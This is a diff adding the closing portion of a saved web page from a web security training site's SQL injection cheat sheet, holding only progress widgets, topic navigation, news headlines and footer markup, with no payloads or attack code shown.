+                <polyline fill="none" points="1.03 9.11 9.01 1.14 16.96 9.11" stroke="#fff" stroke-miterlimit="10"/>
+            </svg>
+            <h4>Track your progress</h4>
+        </div>
+        <div class="button-lozenge-container">
+            <label>Learning materials:</label>
+            <a class="button-lozenge" href="/web-security/all-materials">
+                <span>View all</span>
+            </a>
+        </div>
+
+<div class="progress-with-percent">
+    <svg class="progress-bar" height="25">
+        <rect x="0" y="20" class="percent" width="100%" height="5"></rect>
+        <rect x="0" y="20" width="0%" height="5" class="progression-bar"></rect>
+        <text x="0%" y="15">0%</text>
+    </svg>
+</div>        <hr>
+        <div class="button-lozenge-container">
+            <label>Vulnerability labs:</label>
+            <a class="button-lozenge" href="/web-security/all-labs">
+                <span>View all</span>
+            </a>
+        </div>
+
+<div class="progress-with-percent">
+    <svg class="progress-bar" height="25">
+        <rect x="0" y="20" class="percent" width="100%" height="5"></rect>
+        <rect x="0" y="20" width="4%" height="5" class="progression-bar"></rect>
+        <text x="0%" y="15">4%</text>
+    </svg>
+</div>        <hr>
+        <label>Level progress:</label>
+        <div class="flex">
+            
+
+<div class="apprentice-progress">
+    
+<div class="radial-with-total ">
+    <div class="radial-text-element">
+        <div class="radial-text-element__progress">7</div>
+        <div class="radial-text-element__total">of 52</div>
+    </div>
+    <svg class="radial-meter" height="75%" viewBox="0 0 70 70" width="75%">
+        <g transform="rotate(-90 35 35)">
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="Black" stroke-width="5" class="radial-meter__full-ring">
+            </circle>
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="White" stroke-width="5" stroke-dasharray="204.20335" stroke-dashoffset="176.7144375" class="radial-meter__percent-ring">
+            </circle>
+        </g>
+    </svg>
+</div>
+    <div class="text-small x-light-grey">Apprentice</div>
+</div>
+            
+
+<div class="practitioner-progress">
+    
+<div class="radial-with-total ">
+    <div class="radial-text-element">
+        <div class="radial-text-element__progress">3</div>
+        <div class="radial-text-element__total">of 151</div>
+    </div>
+    <svg class="radial-meter" height="75%" viewBox="0 0 70 70" width="75%">
+        <g transform="rotate(-90 35 35)">
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="Black" stroke-width="5" class="radial-meter__full-ring">
+            </circle>
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="White" stroke-width="5" stroke-dasharray="204.20335" stroke-dashoffset="200.1463298013245" class="radial-meter__percent-ring">
+            </circle>
+        </g>
+    </svg>
+</div>
+    <div class="text-small x-light-grey">Practitioner</div>
+</div>
+            
+
+<div class="expert-progress">
+    
+<div class="radial-with-total ">
+    <div class="radial-text-element">
+        <div class="radial-text-element__progress">0</div>
+        <div class="radial-text-element__total">of 36</div>
+    </div>
+    <svg class="radial-meter" height="75%" viewBox="0 0 70 70" width="75%">
+        <g transform="rotate(-90 35 35)">
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="Black" stroke-width="5" class="radial-meter__full-ring">
+            </circle>
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="White" stroke-width="5" stroke-dasharray="204.20335" stroke-dashoffset="204.20335" class="radial-meter__percent-ring">
+            </circle>
+        </g>
+    </svg>
+</div>
+    <div class="text-small x-light-grey">Expert</div>
+</div>
+        </div>
+        <hr>
+        <label>Your level:</label>
+        <div class="flex-columns">
+            <div class="flex">
+                <div class="margin-right-l lab-icon lab-level-display__newbie">
+                    
+<svg viewBox="0 0 57.45 57.45">
+    <text font-size="24" font-stretch="condensed" font-weight="bold" x="13.9" y="32.7">Ne</text>
+    <path d="M57.45,57.45H0V0H57.45ZM2,55.44H55.45V2H2Z"/>
+    <rect height="6.26" width="2" x="6.87" y="7.54"/>
+    <rect height="2" width="26.08" x="15.68" y="42.06"/>
+    <rect height="2" width="12.49" x="22.48" y="46.81"/>
+</svg>
+                </div>
+                <div>
+                    <div class="lab-level-display__newbie">
+                        NEWBIE
+                    </div>
+                        <span class="x-light-grey small-lab-reminder">
+                            Solve 45 more labs to become an apprentice.
+                        </span>
+                </div>
+            </div>
+            <a class="hof-pointer lab-level-display__newbie chevron-after" href="/web-security/hall-of-fame">See where you rank on our Hall of Fame</a>
+        </div>
+</div>
+
+
+        
+    <div class="widgetcontainer-box is-pagestatus">
+        <h5>SQL injection cheat sheet</h5>
+        <form action="/Academy/Labs/MarkAsComplete" id="PageCompleteForm" method="post">
+            <input type="hidden" id="RequestVerificationToken" name="RequestVerificationToken" value="D55AB959D15A989E1D5EC5503B6F92A84FB56F602A3C02352DEB8A23F0AD391054FF972E4EC6D08E0D061F6147E2E5AB3C0DBB698F468DD12ACC6B5E22B166A0">
+            <input type="hidden" name="CompletedMaterialUrl" value="/web-security/sql-injection/cheat-sheet">
+            <input type="hidden" id="PageIsCompleted" name="IsCompleted" value="true">
+
+            <span id="PageCompletedContent" class="hidden">
+                <label>Complete</label>
+                <button class="transparent-button" id="widget-pagestatus-completedtick" type="submit"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="14" viewBox="0 0 20 14"><polygon points="18.86 0 7.24 11.71 1.14 5.57 0 6.71 7.24 14 20 1.14 18.86 0" fill="#70d16d"/></svg></button>
+            </span>
+            <span id="PageNotCompleteContent" class="">
+                <button class="button-checkbox-fake" data-spinnerid="widgetcheckbox-spinner" id="widgetcheckbox-pagestatus" type="submit"></button>
+                <label for="widgetcheckbox-pagestatus">Mark as complete</label>
+            </span>
+            <span class="widget-spinner" id="widgetcheckbox-spinner"></span>
+        <input name="__RequestVerificationToken" type="hidden" value="CfDJ8CPSohn94A1PhjnHUTvYV0lP6pYZPJS9zxjuCglu_dfkthMwUxMByuEG9ZrVuNYqU_s8wsi0RyKEbggZH5xf3C49lsX3O3chyNw3mD22a-kgqkat4zm6JuHh4eWXBwiFiFb53B3spwHCWKf5AtTjh2Q"></form>
+    </div>
+
+        <div class="widgetcontainer-box is-linklist">
+            <h4>In this topic</h4>
+            <a href="/web-security/sql-injection">SQL injection</a>
+            <a href="/web-security/sql-injection/union-attacks">UNION attacks</a>
+            <a href="/web-security/sql-injection/examining-the-database">Examining the database</a>
+            <a href="/web-security/sql-injection/blind">Blind SQL injection</a>
+            <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>
+        </div>
+        <div class="widgetcontainer-box is-linklist">
+            <h4>All topics</h4>
+            <a href="/web-security/sql-injection">SQL injection</a>
+            <a href="/web-security/cross-site-scripting">XSS</a>
+            <a href="/web-security/csrf">CSRF</a>
+            <a href="/web-security/clickjacking">Clickjacking</a>
+            <a href="/web-security/dom-based">DOM-based</a>
+            <a href="/web-security/cors">CORS</a>
+            <a href="/web-security/xxe">XXE</a>
+            <a href="/web-security/ssrf">SSRF</a>
+            <a href="/web-security/request-smuggling">Request smuggling</a>
+            <a href="/web-security/os-command-injection">Command injection</a>
+            <a href="/web-security/server-side-template-injection">Server-side template injection</a>
+            <a href="/web-security/deserialization">Insecure deserialization</a>
+            <a href="/web-security/file-path-traversal">Directory traversal</a>
+            <a href="/web-security/access-control">Access control</a>
+            <a href="/web-security/authentication">Authentication</a>
+            <a href="/web-security/oauth">OAuth authentication</a>
+            <a href="/web-security/logic-flaws">Business logic vulnerabilities</a>
+            <a href="/web-security/web-cache-poisoning">Web cache poisoning</a>
+            <a href="/web-security/host-header">HTTP Host header attacks</a>
+            <a href="/web-security/websockets">WebSockets</a>
+            <a href="/web-security/information-disclosure">Information disclosure</a>
+            <a href="/web-security/file-upload">File upload vulnerabilities</a>
+            <a href="/web-security/jwt">JWT attacks</a>
+            <a href="/web-security/essential-skills">Essential skills</a>
+            <a href="/web-security/prototype-pollution">Prototype pollution</a>
+        </div>
+        <div class="widget-orange">
+            <img alt="Try Burp Suite for Free" src="https://portswigger.net/content/images/logos/burp-suite-icon.svg">
+            <h4>Find SQL injection vulnerabilities using Burp Suite</h4>
+            <a class="button-white" href="https://portswigger.net/burp">Try for free</a>
+        </div>
+	
+                    </div>
+                </div>
+        </section>
+
+
+        
+            <div class="widget-tile">
+                <div class="container">
+                    <h3 class="text-center charcoal">Stories from the Daily Swig about SQL injection</h3>
+                    <noscript>
+                        <div class="noscript-warning">This page requires JavaScript for an enhanced user experience.</div>
+                    </noscript>
+                    <div class="widget-tile-container has-1rows margin-top-m">
+
+
+<a href="/daily-swig/meet-teler-waf-security-focused-http-middleware-for-the-go-framework" class="tile-container  onecolumn widget-tile size0 style0 textstyle4 is-whitebackground" data-backgroundcolorid="8">
+    
+<h3 class="tile-text1 ">
+        <span class="tile-text-container">Meet teler-waf</span>
+</h3>
+
+
+    <span class="tile-text2">
+            <span class="tile-text-container">Security-focused HTTP middleware for the Go framework</span>
+    </span>
+    
+<span class="tile-date">09 January 2023</span>
+    
+<span class="tile-text1-alt">Meet teler-waf</span>
+        
+        <span class="tile-text2-alt">Security-focused HTTP middleware for the Go framework</span>
+
+</a>
+
+<a href="/daily-swig/car-companies-massively-exposed-to-web-vulnerabilities" class="tile-container  onecolumn widget-tile size0 style1 textstyle2 is-whitebackground" data-backgroundimageurl="/cms/images/e1/38/4518-tile-230104-car-hacking-1x1.png" data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+Car companies massively exposed to web vulnerabilities</h3>
+    
+<span class="tile-date">04 January 2023</span>
+    
+<span class="tile-text1-alt">Car companies massively exposed to web vulnerabilities</span>
+        
+        <span class="tile-text2-alt">Grand hack auto</span>
+
+</a>
+
+<a href="/daily-swig/json-syntax-hack-allowed-sql-injection-payloads-to-be-smuggled-past-wafs" class="tile-container  onecolumn widget-tile size0 style1 textstyle2 is-whitebackground" data-backgroundimageurl="/cms/images/55/2a/989b-tile-waf_spring_1x1.jpg" data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+JSON syntax hack allowed SQLi payloads to sneak past WAFs</h3>
+    
+<span class="tile-date">09 December 2022</span>
+    
+<span class="tile-text1-alt">JSON syntax hack allowed SQLi payloads to sneak past WAFs</span>
+        
+        <span class="tile-text2-alt">Five vendors act to thwart generic hack</span>
+
+</a>
+
+<a href="/daily-swig/zendesk-explore-flaws-opened-the-door-to-account-pillage" class="tile-container  onecolumn widget-tile size0 style1 textstyle0 is-whitebackground" data-backgroundimageurl="/cms/images/cb/39/fc6b-tile-zendesk_1x1.jpg" data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+Zendesk Explore flaws opened door to account pillage</h3>
+    
+<span class="tile-date">15 November 2022</span>
+    
+<span class="tile-text1-alt">Zendesk Explore flaws opened door to account pillage</span>
+        
+        <span class="tile-text2-alt">Patched SQLi and logical access vulnerabilities posed serious risk</span>
+
+</a>                    </div>
+                </div>
+            </div>
+
+    
+
+    <script src="/bundles/public/staticcms.js?v=NjO-trKhcnCUOUYWjUKZXr2jqLk" nonce="q1sAw0Ucd7DBK&#x2B;Lj8dhBRnM/085O7Joy"></script>
+
+
+        
+    <footer class="wrapper">
+        <div class="container">
+            <div>
+                <p>Burp Suite</p>
+                <a href="/burp/vulnerability-scanner">Web vulnerability scanner</a>
+                <a href="/burp">Burp Suite Editions</a>
+                <a href="/burp/releases">Release Notes</a>
+            </div>
+            <div>
+                <p>Vulnerabilities</p>
+                <a href="/web-security/cross-site-scripting">Cross-site scripting (XSS)</a>
+                <a href="/web-security/sql-injection">SQL injection</a>
+                <a href="/web-security/csrf">Cross-site request forgery</a>
+                <a href="/web-security/xxe">XML external entity injection</a>
+                <a href="/web-security/file-path-traversal">Directory traversal</a>
+                <a href="/web-security/ssrf">Server-side request forgery</a>
+            </div>
+            <div>
+                <p>Customers</p>
+                <a href="/organizations">Organizations</a>
+                <a href="/testers">Testers</a>
+                <a href="/developers">Developers</a>
+            </div>
+            <div>
+                <p>Company</p>
+                <a href="/about">About</a>
+                <a href="/news">PortSwigger News</a>
+                <a href="/careers">Careers</a>
+                <a href="/about/contact">Contact</a>
+                <a href="/legal">Legal</a>
+                <a href="/privacy">Privacy Notice</a>
+            </div>
+            <div>
+                <p>Insights</p>
+                <a href="/web-security">Web Security Academy</a>
+                <a href="/blog">Blog</a>
+                <a href="/research">Research</a>
+                <a href="/daily-swig">The Daily Swig</a>
+            </div>
+            <div>
+                <a href="/"><img src="/content/images/logos/portswigger-logo.svg" alt="PortSwigger Logo" class="footer-logo"></a>
+                <a class="button-outline-blue-small camelcase" href="https://twitter.com/Burp_Suite" rel="noreferrer"><span class="icon-twitter"></span>  Follow us</a>
+                <p class="grey">&copy; 2023 PortSwigger Ltd.</p>
+            </div>
+        </div>
+    </footer>
+    <a href="#top" class="back-to-top"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26"><polygon points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7" fill="#f63" /><path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63" /></svg></a>
+
+    </body>
+</html>
